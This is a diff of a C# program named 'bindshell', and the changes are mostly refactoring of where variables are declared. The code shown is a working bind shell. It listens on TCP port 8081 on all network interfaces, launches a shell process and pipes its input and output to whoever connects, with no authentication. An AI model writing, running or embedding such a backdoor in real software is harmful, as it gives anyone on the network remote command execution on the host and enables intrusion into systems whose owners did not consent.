@@ -50,7 +50,6 @@ namespace bindshell
                     try
                     {
                         Output.WriteLine(sr.ReadLine());
-
                     }
                     catch (Exception) { }
                 }
@@ -70,12 +69,15 @@ namespace bindshell
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
-        static CancellationTokenSource CTokenSrc;
-        static Process Shell;
+
         [STAThread]
         static void Main()
         {
-            
+            Socket Listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            Socket client;
+            CancellationTokenSource CTokenSrc;
+            Process Shell;
+
             Shell = new Process();
             Shell.StartInfo = new ProcessStartInfo()
             {
@@ -86,10 +88,9 @@ namespace bindshell
                 RedirectStandardInput = true,
                 RedirectStandardOutput = true
             };
+
             CTokenSrc = new CancellationTokenSource();
 
-            Socket Listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            Socket client;
             Task tErr, tOut, tIn;
 
             Listener.Bind(new IPEndPoint(IPAddress.Any, 8081));
@@ -103,12 +104,14 @@ namespace bindshell
                 tOut = Shell.StandardOutput.CreateOutputTask(ns, CTokenSrc.Token);
                 tErr = Shell.StandardError.CreateOutputTask(ns, CTokenSrc.Token);
                 tIn = Shell.StandardInput.CreateInputTask(ns, CTokenSrc.Token);
+
                 SocketService.StartAllTask(tErr, tOut, tIn);
 
                 while (!client.Poll(5000, SelectMode.SelectRead)) 
                 {
                     if (Shell.HasExited) break;
-                }                
+                }
+                
                 CTokenSrc.Cancel();
                 if (!Shell.HasExited) Shell.Kill();
                 Task.WaitAll(tErr, tOut, tIn);
